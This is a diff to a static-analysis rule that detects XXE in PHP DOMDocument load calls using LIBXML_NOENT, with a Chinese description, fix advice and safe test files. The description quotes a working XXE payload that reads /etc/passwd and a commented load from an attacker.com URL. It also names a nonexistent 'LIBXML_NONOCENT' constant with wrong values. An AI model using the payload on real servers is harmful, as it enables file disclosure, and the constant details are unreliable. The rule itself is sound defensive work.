@@ -8,33 +8,33 @@ desc(
 ### 漏洞描述
 
 1. **漏洞原理**
-   XML External Entity (XXE) 漏洞允许攻击者利用应用程序解析 XML 输入时的漏洞，通过构造恶意XML引用外部实体（例如本地文件、远程URL等），访问本地文件系统或远程服务器上的文件，甚至执行服务器端的代码。当在 PHP 中使用 `DOMDocument` 类的 `load` 方法加载不受信任的 XML 数据，并且同时启用了 `LIBXML_NOENT`（或默认已启用，旧版本行为）选项时，XML解析器会积极地替换外部实体为其实际内容。如果攻击者能在XML中定义一个指向敏感文件或URL的外部实体，解析器就会加载并处理该内容，从而导致数据泄露、服务拒绝甚至远程代码执行。
+XML External Entity (XXE) 漏洞允许攻击者利用应用程序解析 XML 输入时的漏洞，通过构造恶意XML引用外部实体（例如本地文件、远程URL等），访问本地文件系统或远程服务器上的文件，甚至执行服务器端的代码。当在 PHP 中使用 `DOMDocument` 类的 `load` 方法加载不受信任的 XML 数据，并且同时启用了 `LIBXML_NOENT`（或默认已启用，旧版本行为）选项时，XML解析器会积极地替换外部实体为其实际内容。如果攻击者能在XML中定义一个指向敏感文件或URL的外部实体，解析器就会加载并处理该内容，从而导致数据泄露、服务拒绝甚至远程代码执行。
 
 2. **触发场景**
-   当应用接收用户可控的 XML 数据，并使用 `DOMDocument` 的 `load` 方法进行解析时，如果未禁用外部实体加载或使用 `LIBXML_NONOCENT` 选项，则可能触发XXE。
-   ```php
-   // 存在漏洞的代码示例
-   <?php
-   $xml = $_POST['xml_data']; // 用户输入的XML数据
-   $doc = new DOMDocument();
-   $doc->loadXML($xml, LIBXML_NOENT); // 存在XXE风险
-   // 或者使用 load 方法加载外部文件
-   // $doc->load('http://attacker.com/malicious.xml', LIBXML_NOENT); // 存在XXE风险
-   ?>
-   ```
-   攻击者可以构造如下XML提交给应用:
-   ```xml
-   <?xml version="1.0" encoding="UTF-8"?>
-   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-   <root>&xxe;</root>
-   ```
-   如果服务器解析了这个XML，`/etc/passwd` 文件的内容就可能被加载到XML文档中，并在后续处理中暴露给攻击者。
+当应用接收用户可控的 XML 数据，并使用 `DOMDocument` 的 `load` 方法进行解析时，如果未禁用外部实体加载或使用 `LIBXML_NONOCENT` 选项，则可能触发XXE。
+```php
+// 存在漏洞的代码示例
+<?php
+$xml = $_POST['xml_data']; // 用户输入的XML数据
+$doc = new DOMDocument();
+$doc->loadXML($xml, LIBXML_NOENT); // 存在XXE风险
+// 或者使用 load 方法加载外部文件
+// $doc->load('http://attacker.com/malicious.xml', LIBXML_NOENT); // 存在XXE风险
+?>
+```
+攻击者可以构造如下XML提交给应用:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+```
+如果服务器解析了这个XML，`/etc/passwd` 文件的内容就可能被加载到XML文档中，并在后续处理中暴露给攻击者。
 
 3. **潜在影响**
-   - 敏感文件内容泄露（如配置文件、源代码、用户凭证等）。
-   - 探测内部网络结构和服务。
-   - 发起拒绝服务攻击（XML炸弹）。
-   - 在特定配置下可能导致远程代码执行。
+- 敏感文件内容泄露（如配置文件、源代码、用户凭证等）。
+- 探测内部网络结构和服务。
+- 发起拒绝服务攻击（XML炸弹）。
+- 在特定配置下可能导致远程代码执行。
 DESC
 	rule_id: "20b78d2c-a8a9-47d0-b932-610c8f67cb97"
 	reference: <<<REFERENCE
@@ -44,102 +44,99 @@ REFERENCE
 ### 修复建议
 
 1. **禁用外部实体加载**
-   最有效的方法是禁用LIBXML_NOENT选项以及其他可能导致外部实体被处理的选项。对于DOMDocument::loadXML 或 DOMDocument::load，可以通过传递合适的选项来禁用：
-   ```php
-   // 修复代码示例：禁用外部实体加载
-   $xml = $_POST['xml_data'];
-   $doc = new DOMDocument();
-   // 禁用 LIBXML_NOENT 和 LIBXML_NOEXTERNALENT
-   // LIBXML_NONOCENT = 2048 (自 PHP 5.2.10)
-   // LIBXML_NOEXTERNALENT = 16 (自 PHP 5.1.2)
-   // 在较新版本PHP中，LIBXML_NOENT默认是关闭的，但显式禁用更安全
-   $options = 0; // 默认无特殊选项
-   // 如果需要处理DTD，但禁用外部实体，可以使用其他更精细的选项或进行白名单限制。
-   try {
-       $doc->loadXML($xml, $options);
-       // 处理XML
-   } catch (Exception $e) {
-       // 错误处理，例如XML格式错误
-   }
-   ```
-   或者，直接设置 `libxml_disable_entity_loader(true)` 函数来全局禁用实体加载 (但在PHP 8+中已被弃用)。在现代PHP版本中，推荐通过libxml的选项来更精细地控制。
+最有效的方法是禁用LIBXML_NOENT选项以及其他可能导致外部实体被处理的选项。对于DOMDocument::loadXML 或 DOMDocument::load，可以通过传递合适的选项来禁用：
+```php
+// 修复代码示例：禁用外部实体加载
+$xml = $_POST['xml_data'];
+$doc = new DOMDocument();
+// 禁用 LIBXML_NOENT 和 LIBXML_NOEXTERNALENT
+// LIBXML_NONOCENT = 2048 (自 PHP 5.2.10)
+// LIBXML_NOEXTERNALENT = 16 (自 PHP 5.1.2)
+// 在较新版本PHP中，LIBXML_NOENT默认是关闭的，但显式禁用更安全
+$options = 0; // 默认无特殊选项
+// 如果需要处理DTD，但禁用外部实体，可以使用其他更精细的选项或进行白名单限制。
+try {
+$doc->loadXML($xml, $options);
+// 处理XML
+} catch (Exception $e) {
+// 错误处理，例如XML格式错误
+}
+```
+或者，直接设置 `libxml_disable_entity_loader(true)` 函数来全局禁用实体加载 (但在PHP 8+中已被弃用)。在现代PHP版本中，推荐通过libxml的选项来更精细地控制。
 
 2. **输入验证和清理**
-   在解析XML之前，对用户输入的XML数据进行严格的验证和清理。例如，使用黑名单或白名单过滤掉DOCCYPE声明、SYSTEM或PUBLIC标识符。
+在解析XML之前，对用户输入的XML数据进行严格的验证和清理。例如，使用黑名单或白名单过滤掉DOCCYPE声明、SYSTEM或PUBLIC标识符。
 
 3. **最小权限原则**
-   运行XML解析服务的用户或进程应具有最小必要的权限，以限制即使发生XXE漏洞时攻击者能够访问的资源范围。
+运行XML解析服务的用户或进程应具有最小必要的权限，以限制即使发生XXE漏洞时攻击者能够访问的资源范围。
 SOLUTION
 )
 
 LIBXML_NOENT<getCall><getCallee>?{<getObject><name>?{have: DOMDocument} && <name>?{have: load} } as $vuln;
 check $vuln;
 alert $vuln for {
-	solution: <<<CODE
+	solution: <<<SOLUTION
 ### 修复建议
-
 1. **禁用外部实体加载**
-   最有效的方法是禁用LIBXML_NOENT选项以及其他可能导致外部实体被处理的选项。对于DOMDocument::loadXML 或 DOMDocument::load，可以通过传递合适的选项来禁用：
-   ```php
-   // 修复代码示例：禁用外部实体加载
-   $xml = $_POST['xml_data'];
-   $doc = new DOMDocument();
-   // 禁用 LIBXML_NOENT 和 LIBXML_NOEXTERNALENT
-   // LIBXML_NONOCENT = 2048 (自 PHP 5.2.10)
-   // LIBXML_NOEXTERNALENT = 16 (自 PHP 5.1.2)
-   // 在较新版本PHP中，LIBXML_NOENT默认是关闭的，但显式禁用更安全
-   $options = 0; // 默认无特殊选项
-   // 如果需要处理DTD，但禁用外部实体，可以使用其他更精细的选项或进行白名单限制。
-   try {
-       $doc->loadXML($xml, $options);
-       // 处理XML
-   } catch (Exception $e) {
-       // 错误处理，例如XML格式错误
-   }
-   ```
-   或者，直接设置 `libxml_disable_entity_loader(true)` 函数来全局禁用实体加载 (但在PHP 8+中已被弃用)。在现代PHP版本中，推荐通过libxml的选项来更精细地控制。
-
+最有效的方法是禁用LIBXML_NOENT选项以及其他可能导致外部实体被处理的选项。对于DOMDocument::loadXML 或 DOMDocument::load，可以通过传递合适的选项来禁用：
+```php
+// 修复代码示例：禁用外部实体加载
+$xml = $_POST['xml_data'];
+$doc = new DOMDocument();
+// 禁用 LIBXML_NOENT 和 LIBXML_NOEXTERNALENT
+// LIBXML_NONOCENT = 2048 (自 PHP 5.2.10)
+// LIBXML_NOEXTERNALENT = 16 (自 PHP 5.1.2)
+// 在较新版本PHP中，LIBXML_NOENT默认是关闭的，但显式禁用更安全
+$options = 0; // 默认无特殊选项
+// 如果需要处理DTD，但禁用外部实体，可以使用其他更精细的选项或进行白名单限制。
+try {
+$doc->loadXML($xml, $options);
+// 处理XML
+} catch (Exception $e) {
+// 错误处理，例如XML格式错误
+}
+```
+或者，直接设置 `libxml_disable_entity_loader(true)` 函数来全局禁用实体加载 (但在PHP 8+中已被弃用)。在现代PHP版本中，推荐通过libxml的选项来更精细地控制。
 2. **输入验证和清理**
-   在解析XML之前，对用户输入的XML数据进行严格的验证和清理。例如，使用黑名单或白名单过滤掉DOCCYPE声明、SYSTEM或PUBLIC标识符。
-
+在解析XML之前，对用户输入的XML数据进行严格的验证和清理。例如，使用黑名单或白名单过滤掉DOCCYPE声明、SYSTEM或PUBLIC标识符。
 3. **最小权限原则**
-   运行XML解析服务的用户或进程应具有最小必要的权限，以限制即使发生XXE漏洞时攻击者能够访问的资源范围。
-CODE
-	desc: <<<CODE
+运行XML解析服务的用户或进程应具有最小必要的权限，以限制即使发生XXE漏洞时攻击者能够访问的资源范围。
+SOLUTION
+	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   XML External Entity (XXE) 漏洞允许攻击者利用应用程序解析 XML 输入时的漏洞，通过构造恶意XML引用外部实体（例如本地文件、远程URL等），访问本地文件系统或远程服务器上的文件，甚至执行服务器端的代码。当在 PHP 中使用 `DOMDocument` 类的 `load` 方法加载不受信任的 XML 数据，并且同时启用了 `LIBXML_NOENT`（或默认已启用，旧版本行为）选项时，XML解析器会积极地替换外部实体为其实际内容。如果攻击者能在XML中定义一个指向敏感文件或URL的外部实体，解析器就会加载并处理该内容，从而导致数据泄露、服务拒绝甚至远程代码执行。
-
+XML External Entity (XXE) 漏洞允许攻击者利用应用程序解析 XML 输入时的漏洞，通过构造恶意XML引用外部实体（例如本地文件、远程URL等），访问本地文件系统或远程服务器上的文件，甚至执行服务器端的代码。当在 PHP 中使用 `DOMDocument` 类的 `load` 方法加载不受信任的 XML 数据，并且同时启用了 `LIBXML_NOENT`（或默认已启用，旧版本行为）选项时，XML解析器会积极地替换外部实体为其实际内容。如果攻击者能在XML中定义一个指向敏感文件或URL的外部实体，解析器就会加载并处理该内容，从而导致数据泄露、服务拒绝甚至远程代码执行。
 2. **触发场景**
-   当应用接收用户可控的 XML 数据，并使用 `DOMDocument` 的 `load` 方法进行解析时，如果未禁用外部实体加载或使用 `LIBXML_NONOCENT` 选项，则可能触发XXE。
-   ```php
-   // 存在漏洞的代码示例
-   <?php
-   $xml = $_POST['xml_data']; // 用户输入的XML数据
-   $doc = new DOMDocument();
-   $doc->loadXML($xml, LIBXML_NOENT); // 存在XXE风险
-   // 或者使用 load 方法加载外部文件
-   // $doc->load('http://attacker.com/malicious.xml', LIBXML_NOENT); // 存在XXE风险
-   ?>
-   ```
-   攻击者可以构造如下XML提交给应用:
-   ```xml
-   <?xml version="1.0" encoding="UTF-8"?>
-   <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-   <root>&xxe;</root>
-   ```
-   如果服务器解析了这个XML，`/etc/passwd` 文件的内容就可能被加载到XML文档中，并在后续处理中暴露给攻击者。
-
+当应用接收用户可控的 XML 数据，并使用 `DOMDocument` 的 `load` 方法进行解析时，如果未禁用外部实体加载或使用 `LIBXML_NONOCENT` 选项，则可能触发XXE。
+```php
+// 存在漏洞的代码示例
+<?php
+$xml = $_POST['xml_data']; // 用户输入的XML数据
+$doc = new DOMDocument();
+$doc->loadXML($xml, LIBXML_NOENT); // 存在XXE风险
+// 或者使用 load 方法加载外部文件
+// $doc->load('http://attacker.com/malicious.xml', LIBXML_NOENT); // 存在XXE风险
+?>
+```
+攻击者可以构造如下XML提交给应用:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>&xxe;</root>
+```
+如果服务器解析了这个XML，`/etc/passwd` 文件的内容就可能被加载到XML文档中，并在后续处理中暴露给攻击者。
 3. **潜在影响**
-   - 敏感文件内容泄露（如配置文件、源代码、用户凭证等）。
-   - 探测内部网络结构和服务。
-   - 发起拒绝服务攻击（XML炸弹）。
-   - 在特定配置下可能导致远程代码执行。
-CODE
+- 敏感文件内容泄露（如配置文件、源代码、用户凭证等）。
+- 探测内部网络结构和服务。
+- 发起拒绝服务攻击（XML炸弹）。
+- 在特定配置下可能导致远程代码执行。
+DESC
 	level: "high",
-	title: "Detect PHP DOMDocument Load XXE Vulnerability",
-	title_zh: "检测PHP DOMDocument load XXE漏洞",
+	title: "PHP DOMDocument Load XXE Vulnerability Was Detected",
+	title_zh: "检测到PHP DOMDocument load XXE漏洞",
+	name: "vuln",
+	message: "检测到PHP DOMDocument load方法存在XXE漏洞，并且从数据源（source）到污染汇聚点（sink）间，没有发现任何过滤函数信息。",
+	risk: "XXE",
 }
 
 
@@ -152,5 +149,80 @@ desc(
 $doc = new DOMDocument();
 $doc->load('xxe.xml', LIBXML_NOENT); // Noncompliant
 
+CODE
+	"safefile://SafeXMLParseNoEnt.php": <<<CODE
+<?php
+// 推荐的修复方法：禁用LIBXML_NOENT或不传递任何可能导致XXE的选项。
+// 在现代PHP版本中，LIBXML_NOENT默认是关闭的，但显式地不对其赋值是更安全的做法。
+$xml = '<root><data>hello</data></root>'; // 假设这是经过验证的输入
+$doc = new DOMDocument();
+
+// 情况1: 不使用LIBXML_NOENT，这是默认且安全的方式
+try {
+    $doc->loadXML($xml);
+    echo "XML processed safely without LIBXML_NOENT.\n";
+} catch (Exception $e) {
+    echo "Error processing XML: " . $e->getMessage() . "\n";
+}
+
+// 情况2: 明确传递0作为选项，禁用所有特殊选项，包括LIBXML_NOENT
+// 这是一个更清晰的表示，表明没有启用任何可能引起XXE的选项
+try {
+    $doc->loadXML($xml, 0);
+    echo "XML processed safely with 0 options.\n";
+} catch (Exception $e) {
+    echo "Error processing XML: " . $e->getMessage() . "\n";
+}
+
+// 情况3: 使用 libxml_disable_entity_loader (适用于PHP 8 之前，PHP 8+ 已弃用此函数)
+// 在解析前全局禁用外部实体加载
+// libxml_disable_entity_loader(true); // 如果在旧版本PHP中可用且需要全局禁用
+// try {
+//     $doc->loadXML($xml);
+//     echo "XML processed safely with libxml_disable_entity_loader.\n";
+// } catch (Exception $e) {
+//     echo "Error processing XML: " . $e->getMessage() . "\n";
+// }
+
+// 情况4: 加载本地文件，但不启用LIBXML_NOENT。
+// 即使是本地文件，如果内容本身安全，不包含恶意实体引用，且没有启用实体扩展也是安全的。
+// 假设 'safe.xml' 是一个不含外部实体引用的安全XML文件
+// file_put_contents('safe.xml', '<config><setting>value</setting></config>');
+// try {
+//     $doc->load('safe.xml');
+//     echo "Safe local XML file loaded without LIBXML_NOENT.\n";
+// } catch (Exception $e) {
+//     echo "Error loading safe XML: " . $e->getMessage() . "\n";
+// }
+
+// 进一步的安全实践：对用户输入进行严格验证和过滤，防止恶意XML结构。
+// 最好不要直接接收和解析未经充分验证的用户提供的完整XML文档。
+
+?>
+CODE
+	"safefile://SafeXMLLoadLocalFile.php": <<<CODE
+<?php
+// 假设有一个不包含外部实体引用的安全本地XML文件
+// safe_local.xml 文件的内容应为：
+// <data><item>example</item></data>
+
+// 创建一个安全的本地XML文件用于测试
+file_put_contents('safe_local.xml', '<config><setting>local_value</setting></config>');
+
+$doc = new DOMDocument();
+
+// 从本地文件中加载XML，但不启用LIBXML_NOENT。这是安全实践。
+// 即使是文件加载操作，只要不启用外部实体加载，就不会有XXE风险。
+try {
+    $doc->load('safe_local.xml');
+    echo "Successfully loaded safe_local.xml without LIBXML_NOENT.\n";
+    echo "Loaded XML content: " . $doc->saveXML() . "\n";
+} catch (Exception $e) {
+    echo "Error loading XML file: " . $e->getMessage() . "\n";
+}
+
+// 清理测试文件
+unlink('safe_local.xml');
+?>
 CODE
 )
